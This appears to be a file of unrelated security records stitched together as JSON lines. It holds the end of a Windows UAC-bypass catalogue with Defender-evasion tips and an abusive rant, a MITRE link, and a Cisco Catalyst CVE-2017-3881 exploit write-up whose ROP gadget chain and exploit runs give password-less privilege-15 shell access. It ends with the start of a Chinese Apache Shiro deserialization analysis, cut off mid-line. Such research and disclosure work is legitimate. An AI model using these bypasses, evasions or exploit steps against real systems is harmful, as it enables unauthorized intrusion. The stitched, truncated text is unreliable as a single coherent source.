as\nnormal UIAccess application always has >= Medium+ integrity level.\n5) Possible fix\nRemove UIAccess from token if it duplicated from Medium+ IL from a\nprocess with Medium IL. This need actual investigation as there could\nbe unexpected side effects.\n\ud83d\udca5Method #56\n1) Description\nThis method is similar to #33. The only difference is the target key\nand application.Target key here is\nHKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\shell\\open\\c\nommand @Default value (+DeletegateExecute as usual) and trigger is\nwsreset.exe\n2) WD detection\nWD is capable to detect this. Dedicated signatures named\nBehavior:Win32\/UACBypassExp.F!wsreset(2)(3)EF. Writing (direct or\nindirect) to that key default value triggers detection.\n3) WD detection bypass\nPrepare target key structure somewhere else and rename it key component\nto actual name before running target.\n4) Lazy fix for WD\nAdditionally to #33 detect rename key event.\n5) Possible fix\n#Similar to #33\n\ud83d\udca5Method #58\n1) Description\nBased on IEditionUpgradeManager autoelevated COM interface. This\ninterface has method called AcquireModernLicenseWithPreviousId. During\nexecution it starts Clipup.exe process from (what it suppose) windows\nsystem32 folder. It uses %windir% environment variable(sic!) to build\npath to that executable. Thus you can set your own %windir% variable\nand this code will use it to build a path with your controlled location\nin it.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nSame as #34\n5) Possible fix\nCheap and easy fix - get rid of environment variables from Win95 era\nand build a proper path to clipup.exe by using, surprise - surprise!\nGetSystemDirectory.\n\ud83d\udca5Method #59\n1) Description\nThis method abuses debug objects to achieve elevation through appinfo\ndirect talking via RPC. It is complex and non trivial. While it is\nusing same RPC request as #38 it is completely different in\nimplementation and bug\/feature it abuses. At first stage we create non\nelevated process with RPC request and supplying DEBUG_PROCESS flag in\nprocess startup parameters. When appinfo processes our launch process\nrequest it uses CreateProcessAsUser API which automatically will create\ndebug object if DEBUG_PROCESS is specified in process startup flags.\nThe handle for this debug object will be stored inside TEB reserved\nfield. All processes created by the same thread will share the same\ndebug object. Note that appinfo uses thread pool so it could make sense\nto spam it with requests to fill it all. We capture debug object with\nNtQueryInformationProcess(ProcessDebugObjectHandle) call, detach\ndebugger with NtRemoveProcessDebug and kill our first process - it was\nonly needed to allocate debug object on appinfo side. On the next stage\nwe run autoelevated process again with help of direct RPC call and set\nthread debug object to our saved one. Next we process standard\ndebugging message loop looking for CREATE_PROCESS_DEBUG_EVENT. Once hit\nwe capture process handle from event and duplicate it with\nPROCESS_ALL_ACCESS desired access rights. Then resulting handle used to\ncreate final payload process with help of CreateProcess and\nPROC_THREAD_ATTRIBUTE_PARENT_PROCESS.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nDetect parent process creation.\n5) Possible fix\nThis need a fix on appinfo side. Perhaps you could ensure that there is\nno debug object set when creating a High IL process by request from\nMedium IL.\n\ud83d\udca5Method #61\n1) Description\nThis method is similar to #33. The only difference is the target key\nand application. Target key here is\nHKCU\\Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command\n@Default value (+DeletegateExecute as usual) and trigger is slui.exe\nwhich is started with runas verb.\n2) WD detection\nWD is capable to detect this. As detection it will show you one of the\npreviously highlighted behavior signature names used in similar methods\nas they cross check this method. Writing (direct or indirect) to that\nkey default value triggers detection.\n3) WD detection bypass\n#Similar to #33\n4) Lazy fix for WD\nSimilar to #33\n5) Possible fix\nSimilar to #33\n\ud83d\udca5Method #63\n1) Description\nThis method is relatively new. It uses dll injection to the Windows\nNative Image Cache (NIC), forces it to be used and then exploits by\nrunning Windows Firewall MMC snap-in. Files in NIC are accessible to\nAdministrators group so we can reset their security permissions (by\nusing ISecurityEditor autoelevated COM interface) and after that\noverwrite file contents with your payload. Required target file for\noverwrite located by searching in installed assemblies and comparing\nMVID (Module Version Id) of files.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nDetect write event to NIC from Medium IL process.\n5) Possible fix\nAdministrator group should not have write access to NIC directory and\nit contents.\nP.S.\nOf course the best and lazy way to circumvent everything from above is\nnot use Administrator group account at all. I'm not talking about\nAlwaysNofity UAC setting because as proven by time it is useless.\nHowever I would like to point that current Windows eco system evolved\nfrom Windows XP times with deep rejection of UAC since Vista fuckup.\nThus, no matter what you tell or want, default account still will have\nadministrator group. Idiotic shield icon doesn't help a lot too giving\npeople sort of placebo. Nothing from above is a rocket science or\nrequire millions of dollars for fix. Fix your leaky shield.\nAs of UACMe 3.5 I've no further plans to fight WD next wave of\nsignatures by giving them free help. I have no doubt they will\nimplement more and more measures against UAC bypasses in future, not\nnecessary against mentioned methods or in the mentioned ways. It\ndoesn't really matter and personally I don't care. What I wanted to\nshow - is that if someone want to bypass WD behavior signature - it\nwill highly likely do this without significant problems.\nIf something new, creative and working will be discovered - it will be\nadded in UACMe 3.5+ versions. Old 3.2.7 branch will be still available\nbut without any further support from my side. Speaking about new,\ncreative and working methods - see P.P.S. next.\nP.P.S. Comedy Section Bonus\nEvery year you can find a lot of junk noise about yet another \"uac\nbypass\" involving something with Open\/Save\/Print what ever dialogs. It\nis when \"hackers\" runs some elevated process, then clicks somewhere in\nit menu, spawns shell dialog and runs programs from it through menu.\nWoohoo, Windoze Byp@$$3d M1cr0$0ft SuXx! Or another example is some\nmodification in system that must be triggered by manual clicking\nsomewhere in target application running at High IL.\nNothing from this is UAC bypass as it require massive user interactions\nwith UI and target applications have High IL preventing GUI hacking.\nThat doesn't mean you can't do GUI hacking at all - method #55 proves\nit is possible, however NONE of these elite hackers are even close to\nsomething like that, because it is simple not their level. Any of such\nposts are just attention whoring and nothing else. If you can't\nautomate your \"bypass\" it is not a bypass otherwise I'm giving you\nultimate UAC bypass working with AlwaysNotify - select an executable\nfile on disk, right click on it - press \"Run as Administrator\", when\nUAC window popup - confirm it. Ultimate \"bypass\" done, probably needs a\nvideo to be recorded, ROFL.\nAnother kind of attention whore scam release their ultimate \"private\"\ntools (together with snot with bubbles) claiming old well known methods\nas something they used \"privately\" for \"years\" and now \"released to the\npublic\", because they, you know, \"s3curity r3s3arch3rs\" (just like that\nfunny guy who managed to copy-paste from everywhere without\nunderstanding what he copy-paste).\nMicrosoft has determination of what they consider security boundary and\nwhat is not. UAC as you guess - is not a boundary, we can go to usual\ndemagogy here, but that is the fact. This is one side of the medal.\nFrom the other side, malware usually need this not only as a some bonus\nbut as critical for it viability. So you have a dilemma - some broken\nmechanics you don't consider as worth looking at and real malware\ntaking this as essential part. Because of that you always will have a\nlot of noise around UAC. Unfortunately most of this noise will come\nfrom typical internet idiots (included in target audience of malware\nand most of malware developers).\nUnfortunately both types of mentioned guys does a lot of white noise\neach year which makes it harder to find real methods as you have to\nfilter out tons of such trash. Don't be like them. While maybe not that\nsophisticated and complicated UAC is still part of Windows and\nintegrated to the system. It is not about OpenDialog. The better you\nunderstand Windows internals the better you understand how UAC works\nand it weakness (and the more you laugh at yet another idiot with\nOpenDialog). Aside of this some of these bypasses are usually\naccompaned by various different mechanics, algorithms and internals\nthat need to be researched.\nThere is a still a lot of possible real UAC bypasses undiscovered since\nthis system mechanics is entirely broken in many ways and these methods\nare just waiting to be exploited."}
{"text":"REFRESH(0 sec): [1]https:\/\/attack.mitre.org\/techniques\/T1546\/003"}
{"text":"#[1]Artem Kondratenko\n[2]Artem Kondratenko\n[3]Twitter [4]GitHub [5]Archives\nCVE-2017-3881 Cisco Catalyst RCE Proof-Of-Concept\nApr 10, 2017\nDo you still have telnet enabled on your Catalyst switches? Think\ntwice, here\u2019s a proof-of-concept remote code execution exploit for\nCatalyst 2960 switch with latest suggested firmware. Check out the\nexploit code [6]here. What follows is a detailed write-up of the\nexploit development process for the vulnerability leaked from CIA\u2019s\narchive on March 7th 2017 and publicly disclosed by Cisco Systems on\nMarch 17th 2017. At the time of writing this post there is no patch\navailable. Nonetheless there is a remediation - disable telnet and use\nSSH instead.\nVault 7 CIA leak\nA series of CIA\u2019s documents were leaked on March 7th 2017 and\n[7]published on WikiLeaks. Among other publications there was an\ninteresting preauth code execution vulnerability that affected multiple\nCisco switches. This vulnerability is code-named [8]ROCEM in the leaked\ndocuments. Although very few technical details were mentioned, few\nthings stand out.\nThe Vault 7\u2019s documents shed a light on the testing process for the\nactual exploit. No exploit source code is available in the leak. Two\nuse cases are highlighted there - the tool can be launched in either\ninteractive mode or set mode. The interactive mode sends the payload\nvia telnet and immediately presents the attacker with command shell in\nthe context of the same telnet connection. Quote from the [9]doc:\nStarted ROCEM interactive session - successful:\nroot@debian:\/home\/user1\/ops\/adverse\/adverse-1r\/rocem# .\/rocem_c3560-ipbase-mz.12\n2-35.SE5.py -i 192.168.0.254\n[+] Validating data\/interactive.bin\n[+] Validating data\/set.bin\n[+] Validating data\/transfer.bin\n[+] Validating data\/unset.bin\n****************************************\nImage: c3560-ipbase-mz.122-35.SE5\nHost: 192.168.0.254\nAction: Interactive\n****************************************\nProceed? (y\/n)y\nTrying 127.0.0.1...\n[*] Attempting connection to host 192.168.0.254:23\nConnected to 127.0.0.1.\nEscape character is '^]'.\n[+] Connection established\n[*] Starting interactive session\nUser Access Verification\nPassword:\nMLS-Sth#\nMLS-Sth# show priv\nCurrent privilege level is 15\nMLS-Sth#show users\nLine User Host(s) Idle Location\n* 1 vty 0 idle 00:00:00 192.168.221.40\nInterface User Mode Idle Peer Address\nMLS-Sth#exit\nConnection closed by foreign host.\nSet mode. Modify switch memory in order to make any\nsubsequent telnet connections passwordless. Quote from the [10]doc:\nTest set\/unset feature of ROCEM\nDUT configured with target configuration and network setup\nDUT is accessed by hopping through three flux nodes as per the CONOP\nReloaded DUT to start with a clean device\nFrom Adverse ICON machine, set ROCEM:\nroot@debian:\/home\/user1\/ops\/adverse\/adverse-1r\/rocem# .\/rocem_c3560-ipbase-mz.12\n2-35.SE5.py -s 192.168.0.254\n[+] Validating data\/interactive.bin\n[+] Validating data\/set.bin\n[+] Validating data\/transfer.bin\n[+] Validating data\/unset.bin\n****************************************\nImage: c3560-ipbase-mz.122-35.SE5\nHost: 192.168.0.254\nAction: Set\n****************************************\nProceed? (y\/n)y\n[*] Attempting connection to host 192.168.0.254:23\n[+] Connection established\n[*] Sending Protocol Step 1\n[*] Sending Protocol Step 2\n[+] Done\nroot@debian:\/home\/user1\/ops\/adverse\/adverse-1r\/rocem#\nVerified I could telnet and rx priv 15 without creds:\nroot@debian:\/home\/user1\/ops\/adverse\/adverse-1r\/rocem# telnet 192.168.0.254\nTrying 192.168.0.254...\nConnected to 192.168.0.254.\nEscape character is '^]'.\nMLS-Sth#\nMLS-Sth#show priv\nCurrent privilege level is 15\nMLS-Sth#\nOne piece of information being useful for me in researching this\nvulnerability was a telnet debug output. Quote from the [11]doc:\n14. Confirm Xetron EAR 5355 - Debug telnet causes anomalous output\n1.Enabled debug telnet on DUT\n2.Set ROCEM\n3.Observed the following:\n000467: Jun 3 13:54:09.330: TCP2: Telnet received WILL TTY-SPEED (32) (refus\ned)\n000468: Jun 3 13:54:09.330: TCP2: Telnet sent DONT TTY-SPEED (32)\n000469: Jun 3 13:54:09.330: TCP2: Telnet received WILL LOCAL-FLOW (33) (refu\nsed)\n000470: Jun 3 13:54:09.330: TCP2: Telnet sent DONT LOCAL-FLOW (33)\n000471: Jun 3 13:54:09.330: TCP2: Telnet received WILL LINEMODE (34)\n000472: Jun 3 13:54:09.330: TCP2: Telnet sent DONT LINEMODE (34) (unimplemen\nted)\n000473: Jun 3 13:54:09.330: TCP2: Telnet received WILL NEW-ENVIRON (39)\n000474: Jun 3 13:54:09.330: TCP2: Telnet sent DONT NEW-ENVIRON (39) (unimple\nmented)\n000475: Jun 3 13:54:09.330: TCP2: Telnet received DO STATUS (5)\n000476: Jun 3 13:54:09.330: TCP2: Telnet sent WONT STATUS (5) (unimplemented\n)\n000477: Jun 3 13:54:09.330: TCP2: Telnet received WILL X-DISPLAY (35) (refus\ned)\n000478: Jun 3 13:54:09.330: TCP2: Telnet sent DONT X-DISPLAY (35)\n000479: Jun 3 13:54:09.330: TCP2: Telnet received DO ECHO (1)\n000480: Jun 3 13:54:09.330: Telnet2: recv SB NAWS 116 29\n000481: Jun 3 13:54:09.623: Telnet2: recv SB 36 92 OS^K'zAuk,Fz90X\n000482: Jun 3 13:54:09.623: Telnet2: recv SB 36 0 ^CCISCO_KITS^Ap\nNote the CISCO_KITS option received by the service on the last line.\nThis proved to be an important string.\nCisco advisory\nOn March 17th 2017 Cisco Systems [12]disclosed a vulnerability present\nin their switches. This disclosure was based on the documents from\nVault 7:\nA vulnerability in the Cisco Cluster Management Protocol (CMP)\nprocessing code in Cisco IOS and Cisco IOS XE Software could allow\nan unauthenticated, remote attacker to cause a reload of an affected\ndevice or remotely execute code with elevated privileges.\nNot much details were available at the time of writing this article,\nexcept for the following paragraph:\nThe Cluster Management Protocol utilizes Telnet internally as a\nsignaling and command protocol between cluster members. The\nvulnerability is due to the combination of two factors:\n* The failure to restrict the use of CMP-specific Telnet options only\nto internal, local communications between cluster members and\ninstead accept and process such options over any Telnet connection\nto an affected device, and\n* The incorrect processing of malformed CMP-specific Telnet options.\nLong story short, the vulnerability allows the attacker to exploit\ntelnet service to gain remote code execution on the target switch. But\nin order to make any use of this advisory I needed more information on\nthe matter. So I decided dig deeper into Cisco Cluster Management\nProtocol.\nSwitch clustering\nAll right! I had two Catalyst 2960 switches for researching this\nvulnerability. Clustering sets a master-slave relation between\nswitches. Master switch is able to get a privileged command shell on\nthe slave. As Cisco mentioned in its advisory, telnet is used as a\ncommand protocol between cluster members. Some info on clustering can\nbe found [13]here and [14]here\u2019s an example of setting up a cluster\nenvironment.\nNow to look for cluster traffic between them. The following should be\nin the master switch config:\ncluster enable CLGRP 0\ncluster member 1 mac-address xxxx.xxxx.xxxx\nThis will add a nearby switch as a cluster slave. rcommand <num> allows\nto get command interface on a slave switch from the master\u2019s interface.\nThis is expected by design.\ncatalyst1>rcommand 1\ncatalyst2>who\nLine       User       Host(s)              Idle       Location\n*  1 vty 0                idle                 00:00:00 10.10.10.10\nInterface      User        Mode                     Idle     Peer Address\nLet\u2019s look at the traffic generated by rcommand:\nllc\nHey! Where da hell is telnet traffic? Advisory clearly states:\nThe Cluster Management Protocol utilizes Telnet internally as a\nsignaling and command protocol between cluster members.\nOk, running show version to see some more traffic:\ncatalyst2>show version\nCisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE1, REL\nEASE SOFTWARE (fc1)\nAha! Telnet traffic is actually being encapsulated into layer 2 LLC\npacket. If we look close enough we will notice IP packets inside with\nchopped MAC addresses at source and destination fields. Inside those\n\u201cIP\u201d packets reside valid TCP frames with a telnet session.\nshow version in cluster traffic\nA telnet session is usually preceded by negotiating telnet options.\nAmong them are: terminal size, terminal type etc. Take a look at the\n[15]RFC for more info.\nRight before being presented with the welcome catalyst2> message an\ninteresting telnet option is transfered to the server side:\ncluster magic string option\nHere you can see a telnet option \u201cCISCO_KITS\u201d sent from the master\nswitch to the slave. The very same string present in the Vault 7\ndocuments during the execution of exploit. Time to take a closer look\nat the switch internals.\nPeeking at firmware\nFirmware is located at flash:<version>.bin on the switch.\ncatalyst2#dir flash:\nDirectory of flash:\/\n2  -rwx     9771282   Mar 1 1993 00:13:28 +00:00  c2960-lanbasek9-mz.122-55.\nSE1.bin\n3  -rwx        2487   Mar 1 1993 00:01:53 +00:00  config.text\nBuilt-in ftp client allows to transfer this firmware to an arbitrary\nftp server. Ok, now to analyze and extract contents of the file with\n[16]binwalk:\n$ binwalk -e c2960-lanbasek9-mz.122-55.SE1.bin\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n112           0x70            bzip2 compressed data, block size = 900k\nIn order to facilitate static analysis of the resulting binary we\nbetter know the firmware load offset. This offset is printed to serial\nconsole during boot process:\nLoading \"flash:c2960-lanbasek9-mz.122-55.SE1.bin\"...@@@@@@@@@@@@@@@@@@@@@@\nFile \"flash:c2960-lanbasek9-mz.122-55.SE1.bin\" uncompressed and installed,\nentry point: 0x3000\nexecuting...\nFire up IDA and let\u2019s roll. CPU architecture is PowerPC 32-bit\nBigEndian. Load the binary at 0x3000:\nida offset\nDiscovering strings\nRemember the CISCO_KITS string in the cluster traffic I captured\nbefore? This was my starting point. After discovering most of the\nfunctions in IDA, I was able to see the cross-refrences to the strings\nlocated at the end of firmware.\nida cisco kits string\n\u201cCISCO_KITS\u201d string is referenced by return_cisco_kits function, which\njust returns this string as char *. We will focus out attention on on\nthe call_cisco_kits function at 0x0004ED8C which calls\nreturn_cisco_kits.\nida proximity\nBecause telnet code is rather symmetrical for client and server here we\nactually can see the format of the buffer that is being sent to the\nserver side - %c%s%c%d:%s:%d:. This actually goes in line with the\nobserved traffic where the sent buffer was \\x03CISCO_KITS\\x012::1:\nif ( telnet_struct->is_client_mode ) \/\/ client mode? then send \"CISCO_KITS\" stri\nng\n{\nif ( telnet_struct->is_client_mode == 1 )\n{\ncisco_kits_string_2 = (char *)return_cisco_kits();\nint_two = return_2();\ntty_str = get_from_tty_struct((telnet_struct *)telnet_struct_arg->tty_stru\nct);\n*(_DWORD *)&telnet_struct_arg->tty_struct[1].field_6D1;\nformat1_ret = format_1(\n128,\n(int)&str_buf[8],\n\"%c%s%c%d:%s:%d:\",\n3,\ncisco_kits_string_2,\n1,\nint_two,\ntty_str,\n0);\ntelnet_struct = (telnet_struct *)telnet_send_sb(\n(int)telnet_struct_arg,\n36,\n0,\n&str_buf[8],\nformat1_ret,\nv8,\nv7,\nv6);\n}\n}\nNotice something? There are two %s string modifiers but only one string\nis actually present in the traffic sample which is CISCO_KITS, the\nsecond one is empty and is confined between two : chars. Further\nobserving the control flow of the very same function I noticed some\nfunny behaviour when dealing with the second string (this time the\nserver-side portion of the code):\nfor ( j = (unsigned __int8)*string_buffer; j != ':'; j = (unsigned __int8)*strin\ng_buffer )\/\/ put data before second \":\" at &str_buf + 152\n{\nstr_buf[v19++ + 152] = j;\n++string_buffer;\n}\nThe data we sent over in the second %s string is actually copied until\n: char without checking the destination boundaries while the target\nbuffer resides on the stack. What does this look like? Correct! [DEL:\nBuffalo :DEL] buffer overflow!\nbuffalo overflow\nGetting code execution\nGetting control of the instruction pointer was easy as it was\noverwritten with the buffer I sent (btw I used [17]IODIDE for\ndebugging). The problem was that heap and stack (which resides on the\nheap) were not executable. My best bet is that this is actually the\neffect of data and instruction caches enabled. Here\u2019s a slide from\nFelix Lindner\u2019s [18]presentation at BlackHat 2009:\npowerpc caches\nROPing a way out\nSince there wasn\u2019t a way to execute code on the stack I had to use it\nas a data buffer and reuse existing code in the firmware. The idea is\nto chain function epilogs in a meaningful way to perform arbitrary\nmemory writes. But wait, write what? Take a look at the decompiled\nfunction at 0x00F47A34:\nif ( ptr_is_cluster_mode(tty_struct_var->telnet_struct_field) )\n{\ntelnet_struct_var = tty_struct_var->telnet_struct_field;\nptr_get_privilege_level = (int (__fastcall *)(int))some_libc_func(0, (unsigned\nint *)&dword_22659D4[101483]);\nprivilege_level = ptr_get_privilege_level(telnet_struct_var);\/\/ equals to 1 du\nring rcommand 1\ntelnet_struct_1 = tty_struct_var->telnet_struct_field;\nptr_telnet_related2 = (void (__fastcall *)(int))some_libc_func(1u, (unsigned i\nnt *)&dword_22659D4[101487]);\nptr_telnet_related2(telnet_struct_1);\n*(_DWORD *)&tty_struct_var->privilege_level_field = ((privilege_level << 28) &\n0xF0000000 | *(_DWORD *)&tty_struct_var->privilege_level_field & 0xFFFFFFF) & 0\nxFF7FFFFF;\n}\nelse\n{\n\/\/generic telnet session\n}\nInteresting things happen here. First thing to emphasize is that both\ncalls of ptr_is_cluster_mode and ptr_get_privilege_level are made\nindirectly by referencing global variables. Check line at address\n0x00F47B60 - is_cluster_mode function address is being loaded from\ndword at 0x01F24A7. In a similar way the address of get_privilege_level\nis being loaded from r3 register at 0x00F47B8C. At this point r3\ncontents is a dereferenced pointer residing at address 0x022659D4 +\n0x28 + 0xC.\nIndirect calls\nIf the ptr_is_cluster_mode call returns non zero and ptr_get_privilege\ncall returns a value that differs from -1 we will be presented with a\ntelnet shell without the need to provide any credentials. Variable\nprivilege_level is being checked for its value further down the code:\nprivilege level check\nWhat if I could overwrite these function pointers to something that\nalways return the desired positive value? Since stack and heap weren\u2019t\ndirectly executable I had to reuse the existing code to performs such\nmemory writes. The following [19]ROP gadgets were used:\n0x000037b4:\nlwz r0, 0x14(r1)\nmtlr r0\nlwz r30, 8(r1)\nlwz r31, 0xc(r1)\naddi r1, r1, 0x10\nblr\nLoad is_cluster_mode function pointer into r30, load the value to\noverwrite this pointer into r31. The value to overwrite is an address\nof a function that always returns 1:\nreturn 1 function\n0x00dffbe8:\nstw r31, 0x34(r30)\nlwz r0, 0x14(r1)\nmtlr r0\nlmw r30, 8(r1)\naddi r1, r1, 0x10\nblr\nPerform the actual write.\n0x0006788c:\nlwz r9, 8(r1)\nlwz r3, 0x2c(r9)\nlwz r0, 0x14(r1)\nmtlr r0\naddi r1, r1, 0x10\nblr\n0x006ba128:\nlwz r31, 8(r1)\nlwz r30, 0xc(r1)\naddi r1, r1, 0x10\nlwz r0, 4(r1)\nmtlr r0\nblr\nPrevious two gadgets load a pointer of get_privilege_level function\ninto r3, and the value to overwrite it with into r31. The target value\nis a function that returns 15 (could\u2019ve used this function for both\nwrites tho):\nreturn 15 function\n0x0148e560:\nstw r31, 0(r3)\nlwz r0, 0x14(r1)\nmtlr r0\nlwz r31, 0xc(r1)\naddi r1, r1, 0x10\nblr\nThis epilog makes the final write and returns to the legitimate\nexecution flow. Of course, stack frame should be formed accordingly to\nmake this rop chain work. Check out the exploit [20]source to see the\nactual stack layout for this chain to work as intended.\nRunning the exploit\nAt the end of the day I ended up with a tool with the ability to patch\nfunction pointers responsible for credless connection and privilege\nlevel. Note that the exploit code is heavily dependent on the exact\nfirmware version used on the switch. Using exploit code for some\ndifferent firmware most probably will crash the device.\nI used the knowledge from static and dynamic analysis of an older\nfirmware SE1 to build an exploit for the latest suggested firmware\n12.2(55)SE11. All the difference between firmware versions is different\nfunctions and pointers offsets. Also, the way the exploit works makes\nit easy to revert the changes back. Example:\n$ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --set\n[+] Connection OK\n[+] Recieved bytes from telnet service: '\\xff\\xfb\\x01\\xff\\xfb\\x03\\xff\\xfd\\x18\\xf\nf\\xfd\\x1f'\n[+] Sending cluster option\n[+] Setting credless privilege 15 authentication\n[+] All done\n$ telnet 192.168.88.10\nTrying 192.168.88.10...\nConnected to 192.168.88.10.\nEscape character is '^]'.\ncatalyst1#show priv\nCurrent privilege level is 15\ncatalyst1#show ver\nCisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(55)SE11, RE\nLEASE SOFTWARE (fc3)\n...\nSystem image file is \"flash:c2960-lanbasek9-mz.122-55.SE11.bin\"\n...\ncisco WS-C2960-48TT-L (PowerPC405) processor (revision B0) with 65536K bytes of\nmemory.\n...\nModel number                    : WS-C2960-48TT-L\n...\nSwitch Ports Model              SW Version            SW Image\n------ ----- -----              ----------            ----------\n*    1 50    WS-C2960-48TT-L    12.2(55)SE11          C2960-LANBASEK9-M\nConfiguration register is 0xF\nTo unset this behaviour:\n$ python c2960-lanbasek9-m-12.2.55.se11.py 192.168.88.10 --unset\n[+] Connection OK\n[+] Recieved bytes from telnet service: '\\xff\\xfb\\x01\\xff\\xfb\\x03\\xff\\xfd\\x18\\xf\nf\\xfd\\x1f\\r\\ncatalyst1#'\n[+] Sending cluster option\n[+] Unsetting credless privilege 15 authentication\n[+] All done\n$ telnet 192.168.88.10\nEscape character is '^]'.\nUser Access Verification\nPassword:\nThis RCE POC is available [21]here for both firmware versions. DoS\nversion of this exploit is [22]available as a metasploit module, it\nmight work for most models mentioned in the Cisco advisory.\nPlease enable JavaScript to view the [23]comments powered by Disqus.\n\u00a9 Artem Kondratenko - Powered by [24]Jekyll & [25]whiteglass -\nSubscribe via [26]RSS"}
{"text":"Apache Shiro <1.2.4\u53cd\u5e8f\u5217\u5316\u5206\u6790\n[1]\u58a8\u5b88\u79d1\u6280\n\u58a8\u5b88\u79d1\u6280\nWeixin ID gh_a7e1d2b2ee2f\nAbout Feature \u5df2\u6ce8\u9500\u3002\nPosted on\n0x01.\u6f0f\u6d1e\u63cf\u8ff0\nApache Shiro\u662f\u4e00\u6b3e\u5f00\u6e90\u5b89\u5168\u6846\u67b6\uff0c\u63d0\u4f9b\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u5b66\u548c\u4f1a\u8bdd\u7ba1\u7406\u3002Shiro\u6846\u67b6\u76f4\u89c2\u3001\u6613\u7528\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u4f9b\u5065\u58ee\u7684\u5b89\u5168\u6027\u3002\nApache Shiro\n1.2.4\u53ca\u4ee5\u524d\u7248\u672c\u4e2d\uff0c\u52a0\u5bc6\u7684\u7528\u6237\u4fe1\u606f\u5e8f\u5217\u5316\u540e\u5b58\u50a8\u5728\u540d\u4e3aremember-me\u7684Cookie\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528Shiro\u7684\u9ed8\u8ba4\u5bc6\u94a5\u4f2a\u9020\u7528\u6237Co\nokie\uff0c\u89e6\u53d1Java\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdb\u800c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\n\u6f0f\u6d1e\u4ea7\u751f\u539f\u56e0\uff1a\nshiro\u9ed8\u8ba4\u4f7f\u7528\u4e86CookieRememberMeManager\uff0c\u5176\u5904\u7406cookie\u7684\u6d41\u7a0b\u662f\uff1a\u5f97\u5230rememberMe\u7684cookie\u503c-->\nBase64\u89e3\u7801-->AES\u89e3\u5bc6-->\u53cd\u5e8f\u5217\u5316\u3002\u7136\u800cAES\u7684\u5bc6\u94a5\u662f\u786c\u7f16\u7801\u7684\uff0c\u5c31\u5bfc\u81f4\u4e86\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u6076\u610f\u6570\u636e\u9020\u6210\u53cd\u5e8f\u5217\u5316\u7684RCE\u6f0f\u6d1e\u3002\npayload \u6784\u9020\n\u6076\u610f\u547d\u4ee4-->\u5e8f\u5217\u5316-->AES\u52a0\u5bc6-->base64\u7f16\u7801-->\u53d1\u9001cookie\n\u5728\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u662fAES\u52a0\u5bc6\u7684\u5bc6\u94a5\uff0c\u8be5\u79d8\u94a5\u9ed8\u8ba4\u662f\u9ed8\u8ba4\u786c\u7f16\u7801\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6ca1\u6709\u4fee\u6539\u9ed8\u8ba4\u7684\u5bc6\u94a5\uff0c\u5c31\u81ea\u5df1\u53ef\u4ee5\u751f\u6210\u6076\u610f\u6784\u9020\u7684cookie\n\u4e86\u3002\n\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff1aApache Shiro <= 1.2.4\nshiro\u7279\u5f81\uff1a\n* \u672a\u767b\u9646\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u6c42\u5305\u7684cookie\u4e2d\u6ca1\u6709rememberMe\u5b57\u6bb5\uff0c\u8fd4\u56de\u5305set-Cookie\u91cc\u4e5f\u6ca1\u6709deleteMe\u5b57\u6bb5\n* \u767b\u9646\u5931\u8d25\u7684\u8bdd\uff0c\u4e0d\u7ba1\u52fe\u9009RememberMe\u5b57\u6bb5\u6ca1\u6709\uff0c\u8fd4\u56de\u5305\u90fd\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5\n* \u4e0d\u52fe\u9009RememberMe\u5b57\u6bb5\uff0c\u767b\u9646\u6210\u529f\u7684\u8bdd\uff0c\u8fd4\u56de\u5305set-Cookie\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5\u3002\u4f46\u662f\u4e4b\u540e\u7684\u6240\u6709\n\u8bf7\u6c42\u4e2dCookie\u90fd\u4e0d\u4f1a\u6709rememberMe\u5b57\u6bb5\n* \u52fe\u9009RememberMe\u5b57\u6bb5\uff0c\u767b\u9646\u6210\u529f\u7684\u8bdd\uff0c\u8fd4\u56de\u5305set-Cookie\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5\uff0c\u8fd8\u4f1a\u6709remem\nberMe\u5b57\u6bb5\uff0c\u4e4b\u540e\u7684\u6240\u6709\u8bf7\u6c42\u4e2dCookie\u90fd\u4f1a\u6709rememberMe\u5b57\u6bb5\n[]\n\u5982\u4f55\u5224\u65ad\u7f51\u7ad9\u662f\u5426\u4f7f\u7528Shiro\n\u53ef\u4ee5\u5c1d\u8bd5\u5728\u8bf7\u6c42\u5305\u4e2d\u7684cookie\u4e2d\u52a0\u5165 rememberMe=1 \uff0c\u6765\u67e5\u770b\u8fd4\u56de\u5305\u662f\u5426\u6709rememberMe=deleteMe\u5b57\u6bb5\u3002\n[]\n[]\n\u5982\u679c\u8bf7\u6c42\u5305\u4e2d\u6ca1\u6709Cookie\u5b57\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u52a0\u4e0a\u8be5\u5b57\u6bb5\uff1aCookie:rememberMe=1\n[]\n0x02. \u6f0f\u6d1e\u5206\u6790\n\u57fa\u7840\u73af\u5883\n\u7f16\u8f91\u5668\uff1aIDEA 2020\njava\u7248\u672c\uff1ajdk1.7.0_80\nServer\u7248\u672c : Tomcat 